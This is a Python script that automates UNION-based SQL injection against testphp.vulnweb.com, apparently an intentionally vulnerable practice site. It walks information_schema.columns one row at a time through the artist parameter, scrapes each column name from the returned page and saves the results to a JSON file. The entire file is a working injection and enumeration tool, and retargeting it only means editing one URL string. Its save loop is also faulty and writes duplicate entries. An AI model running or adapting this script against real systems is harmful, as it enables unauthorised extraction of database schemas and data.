import requests
from bs4 import BeautifulSoup
import json
import os
import time


# url_taget = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,table_column from information_schema.columns limit {},1"
# total_index = 86
url_taget = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,column_name from information_schema.columns limit {},1"
total_index = 430
file_report = "data_acunetic_table_user.json"

def load_existing_file():
    if os.path.exists(file_report):
        with open(file_report,"r") as file:
            existing_data = json.load(file)
            last_limit = existing_data[-1]['limit'] +1 if existing_data else 0
            return existing_data , last_limit
    return [] , 0

def fatch_tabel_name(limit):
    retries = 0
    while retries < 3:
        url = url_taget.format(limit)
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Request failed (Status {response.status_code}) for limit {limit} , Retrying")
            
        if "html" not in response.headers.get('Content-type',''):
            print(f"Invalid response type for limit{limit}")
        else:
            soup = BeautifulSoup(response.content,'html.parser')
            table_name_div = soup.find("div",class_= "story")
            if table_name_div:
                tabel_name = table_name_div.get_text(strip=True)
                tabel_name = tabel_name.replace("view pictures of the artist","").replace("comment on this artist","").strip()
                print(f"table name for ilmit {limit} : {tabel_name}")
                return {"limit" : limit , "table_name" : tabel_name}
            else:
                print(f"table name not found for limit {limit}. Retrying .....")
        retries += 1
        time.sleep(2)
    print(f"Failed to feact data for limit {limit} after 3 retries.")
    return None

def save_data(data):
    with open(file_report,"w") as file:
        json.dump(data,file,indent=4)
        
def main():
    existing_file , last_limit = load_existing_file()
    new_data = []
    for limit in range(last_limit,total_index):
        result = fatch_tabel_name(limit)
        if result : 
            new_data.append(result)
        
        if new_data:
            existing_file.extend(new_data)
            save_data(existing_file)
            print(f"Scraping completed")
        

if __name__ == "__main__":
    main()